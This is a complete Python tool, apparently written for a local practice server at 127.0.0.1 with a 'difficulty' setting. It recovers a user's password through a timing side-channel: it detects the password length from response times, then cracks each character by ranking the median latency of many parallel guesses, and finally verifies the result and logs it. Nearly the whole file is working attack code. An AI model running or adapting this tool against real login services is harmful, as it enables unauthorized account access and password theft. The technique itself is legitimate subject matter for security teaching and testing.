#!/usr/bin/env python3
"""
Interactive Timing Side-Channel Attack (enhanced)

Features added:
- High precision timing prints (12 decimal places)
- Start / end timestamps (ISO) and elapsed times for whole run and each discovered char
- Cleaner interactive config + ability to re-edit values before running
- Save short run summary to a timestamped .txt file
- Ranking mode (2-stage): quick measurements -> pick top-K -> remeasure top-K more times
- No progress/loading bars (clean console output)
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from statistics import median
from typing import Tuple, List, Dict, Optional
from datetime import datetime
import json
import os

# Configuration defaults
BASE_URL = "http://127.0.0.1"
CHARSET = "abcdefghijklmnopqrstuvwxyz"
MAX_LENGTH = 32

# --- Timing helpers ---------------------------------------------------------
def perf_time() -> float:
    """High-resolution timer alias."""
    return time.perf_counter()

def fmt_time(t: float) -> str:
    """Format a float time with high precision (12 decimal places)."""
    return f"{t:.12f}s"

def now_iso() -> str:
    return datetime.now().isoformat(sep=" ", timespec="seconds")

# --- Network measurement ---------------------------------------------------
def measure_time(username: str, password: str, difficulty: int, timeout: float = 10.0) -> float:
    """Measure response time for a single password guess. Returns elapsed seconds or 0 on error."""
    url = f"{BASE_URL}/?user={username}&password={password}&difficulty={difficulty}"
    start = perf_time()
    try:
        requests.get(url, timeout=timeout)
        return perf_time() - start
    except Exception:
        return 0.0

def parallel_measurements(username: str, password: str, difficulty: int,
                          measurements: int, workers: int) -> List[float]:
    """Run `measurements` times in parallel and return the list of positive timings."""
    times: List[float] = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(measure_time, username, password, difficulty) for _ in range(measurements)]
        for future in as_completed(futures):
            t = future.result()
            if t > 0:
                times.append(t)
    return times

def median_time_from_list(times: List[float]) -> float:
    return median(times) if times else 0.0

# --- Ranking-enabled character crack ---------------------------------------
def crack_character_with_ranking(username: str, known_password: str, password_length: int,
                                 difficulty: int,
                                 quick_measurements: int, quick_workers: int,
                                 full_measurements: int, full_workers: int,
                                 top_k: int) -> Tuple[str, float, Dict]:
    """
    Two-stage ranking:
      1) quick_measurements for each candidate char (cheap)
      2) pick top_k candidates by median quick time
      3) re-measure only those candidates with full_measurements to decide
    Returns: (best_char, best_time, debug-info)
    """
    position = len(known_password)
    padding_length = password_length - position - 1
    padding = "a" * padding_length
    debug = {"quick": [], "full": []}

    # Stage 1: quick probe for all chars
    for ch in CHARSET:
        test_pwd = known_password + ch + padding
        times = parallel_measurements(username, test_pwd, difficulty, quick_measurements, quick_workers)
        med = median_time_from_list(times)
        debug["quick"].append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
    # sort quick stage descending by median
    debug["quick"].sort(key=lambda x: x["median"], reverse=True)
    top_candidates = debug["quick"][:top_k]

    # Stage 2: full measurements for top candidates
    for cand in top_candidates:
        ch = cand["char"]
        test_pwd = cand["pwd"]
        times = parallel_measurements(username, test_pwd, difficulty, full_measurements, full_workers)
        med = median_time_from_list(times)
        debug["full"].append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})

    debug["full"].sort(key=lambda x: x["median"], reverse=True)
    best = debug["full"][0]
    return best["char"], best["median"], debug

# --- Non-ranking simple character crack -----------------------------------
def crack_character_simple(username: str, known_password: str, password_length: int,
                           difficulty: int, measurements: int, workers: int) -> Tuple[str, float, Dict]:
    """Test every candidate char with `measurements` and return best by median."""
    position = len(known_password)
    padding_length = password_length - position - 1
    padding = "a" * padding_length
    results = []
    for ch in CHARSET:
        test_pwd = known_password + ch + padding
        times = parallel_measurements(username, test_pwd, difficulty, measurements, workers)
        med = median_time_from_list(times)
        results.append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
    results.sort(key=lambda x: x["median"], reverse=True)
    best = results[0]
    debug = {"results": results}
    return best["char"], best["median"], debug

# --- Phase 1: find length --------------------------------------------------
def find_password_length(username: str, difficulty: int, measurements: int, workers: int) -> Tuple[int, Dict]:
    """Measure median times for 'a' * length for lengths 1..MAX_LENGTH and pick max."""
    length_times = []
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = "a" * length
        times = parallel_measurements(username, test_pwd, difficulty, measurements, workers)
        med = median_time_from_list(times)
        length_times.append({"length": length, "median": med, "samples": len(times)})
        print(f"[Length {length:2d}] {test_pwd[:10]:10s} -> median {fmt_time(med)} (samples={len(times)})")
    # choose length with maximum median time
    best = max(length_times, key=lambda x: x["median"])
    return best["length"], {"length_times": length_times, "picked": best}

# --- Phase 2: crack password ------------------------------------------------
def crack_password(username: str, difficulty: int, length: int,
                   use_ranking: bool,
                   quick_measurements: int, quick_workers: int,
                   full_measurements: int, full_workers: int,
                   top_k: int,
                   simple_measurements: int, simple_workers: int) -> Tuple[str, List[Dict]]:
    """
    Crack password character-by-character.
    Returns discovered password and a log list with per-character metadata.
    """
    discovered = ""
    per_char_log = []

    overall_pos_start = perf_time()
    for pos in range(length):
        pos_start_iso = now_iso()
        print("\n" + "-" * 70)
        print(f"[{pos+1}/{length}] Starting char discovery at {pos_start_iso}")
        print(f"Known so far: '{discovered}'")
        if use_ranking:
            ch, med, debug = crack_character_with_ranking(
                username, discovered, length, difficulty,
                quick_measurements, quick_workers,
                full_measurements, full_workers,
                top_k
            )
            method = "ranking"
        else:
            ch, med, debug = crack_character_simple(
                username, discovered, length, difficulty,
                simple_measurements, simple_workers
            )
            method = "simple"

        discovered += ch
        pos_end = perf_time()
        elapsed = pos_end - overall_pos_start
        print(f"✓ Selected char '{ch}'  median={fmt_time(med)}  (method={method})")
        print(f"Timestamp (char done): {now_iso()}  elapsed for this char (since start of char loop): {fmt_time(elapsed)}")
        # append per-character record
        per_char_log.append({
            "position": pos,
            "char": ch,
            "selected_median": med,
            "method": method,
            "debug": debug,
            "timestamp": now_iso(),
            "elapsed_since_pos_start": elapsed
        })
    return discovered, per_char_log

# --- Verification ----------------------------------------------------------
def verify_password(username: str, password: str, difficulty: int) -> bool:
    url = f"{BASE_URL}/?user={username}&password={password}&difficulty={difficulty}"
    try:
        r = requests.get(url, timeout=10)
        return "1" in r.text
    except Exception:
        return False

# --- Save summary ----------------------------------------------------------
def save_run_summary(output_dir: str,
                     config: Dict,
                     password_length: Optional[int],
                     discovered_password: Optional[str],
                     per_char_log: Optional[List[Dict]],
                     start_iso: str,
                     end_iso: str,
                     total_elapsed: float) -> str:
    """Save a concise summary JSON + human-readable txt file and return filename."""
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_fname = os.path.join(output_dir, f"run_summary_{ts}.json")
    txt_fname = os.path.join(output_dir, f"run_summary_{ts}.txt")

    summary = {
        "config": config,
        "password_length": password_length,
        "discovered_password": discovered_password,
        "start": start_iso,
        "end": end_iso,
        "total_elapsed_seconds": total_elapsed,
        "per_char_count": len(per_char_log) if per_char_log else 0,
    }

    try:
        with open(json_fname, "w") as jf:
            json.dump({"summary": summary, "per_char_log": per_char_log}, jf, indent=2)
        with open(txt_fname, "w") as tf:
            tf.write("=" * 60 + "\n")
            tf.write("TIMING SIDE-CHANNEL RUN SUMMARY\n")
            tf.write("=" * 60 + "\n")
            tf.write(f"Start: {start_iso}\n")
            tf.write(f"End:   {end_iso}\n")
            tf.write(f"Duration: {fmt_time(total_elapsed)}\n\n")
            tf.write("CONFIG:\n")
            for k, v in config.items():
                tf.write(f"  - {k}: {v}\n")
            tf.write("\nRESULT:\n")
            tf.write(f"  - Password length: {password_length}\n")
            tf.write(f"  - Discovered password: {discovered_password}\n")
            tf.write(f"  - Per-character results: {len(per_char_log) if per_char_log else 0}\n")
            tf.write("\n(For details see JSON file.)\n")
        print(f"\n✓ Summary saved to:\n  - {txt_fname}\n  - {json_fname}")
        return txt_fname
    except Exception as e:
        print(f"✗ Error saving summary: {e}")
        return ""

# --- Interactive menu / config ---------------------------------------------
def get_int_input(prompt: str, default: int, min_val: int = 1, max_val: int = 100) -> int:
    while True:
        try:
            raw = input(f"{prompt} [{default}]: ").strip()
            if raw == "":
                return default
            v = int(raw)
            if v < min_val or v > max_val:
                print(f"Please enter between {min_val} and {max_val}")
                continue
            return v
        except ValueError:
            print("Please enter a valid integer")

def interactive_menu():
    # defaults
    cfg = {
        "username": "",
        "difficulty": 1,
        "measurements": 8,
        "workers": 8,
        # ranking defaults
        "use_ranking": True,
        "quick_measurements": 2,
        "quick_workers": 6,
        "full_measurements": 6,
        "full_workers": 8,
        "top_k": 3,
        # simple mode fallback
        "simple_measurements": 8,
        "simple_workers": 8,
        "output_dir": "attack_runs"
    }

    print("\n" + "=" * 70)
    print("    INTERACTIVE TIMING SIDE-CHANNEL (enhanced)")
    print("=" * 70)

    # Username
    while True:
        uname = input("Enter your username/ID: ").strip()
        if uname:
            cfg["username"] = uname
            break
        print("Username cannot be empty.")

    # difficulty
    cfg["difficulty"] = get_int_input("Difficulty (1-10)", default=cfg["difficulty"], min_val=1, max_val=10)

    # quick config values
    cfg["measurements"] = get_int_input("Measurements per probe (default for length finding)", default=cfg["measurements"], min_val=1, max_val=200)
    cfg["workers"] = get_int_input("Parallel workers (default for length finding)", default=cfg["workers"], min_val=1, max_val=200)

    # ranking toggle
    use_rank_raw = input(f"Use ranking two-stage mode? (y/n) [{'y' if cfg['use_ranking'] else 'n'}]: ").strip().lower()
    cfg["use_ranking"] = (use_rank_raw != "n")

    if cfg["use_ranking"]:
        cfg["quick_measurements"] = get_int_input("Quick measurements per candidate (stage 1)", default=cfg["quick_measurements"], min_val=1, max_val=10)
        cfg["quick_workers"] = get_int_input("Workers for quick stage", default=cfg["quick_workers"], min_val=1, max_val=200)
        cfg["full_measurements"] = get_int_input("Full measurements per candidate (stage 2)", default=cfg["full_measurements"], min_val=1, max_val=200)
        cfg["full_workers"] = get_int_input("Workers for full stage", default=cfg["full_workers"], min_val=1, max_val=200)
        cfg["top_k"] = get_int_input("Top-K candidates to keep after quick stage", default=cfg["top_k"], min_val=1, max_val=len(CHARSET))
    else:
        cfg["simple_measurements"] = get_int_input("Measurements per char (simple mode)", default=cfg["simple_measurements"], min_val=1, max_val=200)
        cfg["simple_workers"] = get_int_input("Workers for simple mode", default=cfg["simple_workers"], min_val=1, max_val=200)

    print("\nSummary of configuration:")
    for k, v in cfg.items():
        if k.startswith("quick_") or k.startswith("full_") or k.startswith("simple_") or k in ("use_ranking","top_k"):
            print(f"  - {k}: {v}")
    print("=" * 70)

    # Choose action
    print("What would you like to do?")
    print("1. Find password length only (Phase 1)")
    print("2. Crack password (Phase 2) - requires known/assumed length")
    print("3. Full attack (Phase 1 + Phase 2)")
    choice = get_int_input("Enter choice (1-3)", default=3, min_val=1, max_val=3)

    start_iso = now_iso()
    overall_start = perf_time()

    password_length = None
    discovered_password = None
    per_char_log = None

    if choice == 1:
        print(f"\nStarting Phase 1 (finding length) at {start_iso}")
        password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
        print(f"\nDetected length: {password_length}")
    elif choice == 2:
        length_val = get_int_input(f"Enter known password length (1-{MAX_LENGTH})", default=8, min_val=1, max_val=MAX_LENGTH)
        print(f"\nStarting Phase 2 at {start_iso}")
        discovered_password, per_char_log = crack_password(
            cfg["username"], cfg["difficulty"], length_val,
            cfg["use_ranking"],
            cfg["quick_measurements"], cfg["quick_workers"],
            cfg["full_measurements"], cfg["full_workers"],
            cfg["top_k"],
            cfg["simple_measurements"], cfg["simple_workers"]
        )
    elif choice == 3:
        print(f"\nStarting Full Attack at {start_iso}")
        password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
        print(f"\nDetected length: {password_length}")
        discovered_password, per_char_log = crack_password(
            cfg["username"], cfg["difficulty"], password_length,
            cfg["use_ranking"],
            cfg["quick_measurements"], cfg["quick_workers"],
            cfg["full_measurements"], cfg["full_workers"],
            cfg["top_k"],
            cfg["simple_measurements"], cfg["simple_workers"]
        )

    overall_end = perf_time()
    end_iso = now_iso()
    total_elapsed = overall_end - overall_start

    # Verification & printing
    if discovered_password:
        print("\n" + "=" * 70)
        print("VERIFICATION")
        print("=" * 70)
        ok = verify_password(cfg["username"], discovered_password, cfg["difficulty"])
        if ok:
            print(f"✓ SUCCESS! Password: '{discovered_password}'")
        else:
            print(f"✗ FAILED - attempted password '{discovered_password}' did not verify as correct")
        print(f"Run started: {start_iso}")
        print(f"Run ended:   {end_iso}")
        print(f"Total duration: {fmt_time(total_elapsed)}")
        # Save summary
        config_for_save = {k: cfg[k] for k in cfg if not k.startswith("simple_") or cfg["use_ranking"] is False}
        save_run_summary(cfg["output_dir"], config_for_save, password_length, discovered_password, per_char_log, start_iso, end_iso, total_elapsed)
    elif password_length:
        print(f"\nPassword length found: {password_length}")
        print("Run again with option 2 to crack the password!")

def main():
    try:
        interactive_menu()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
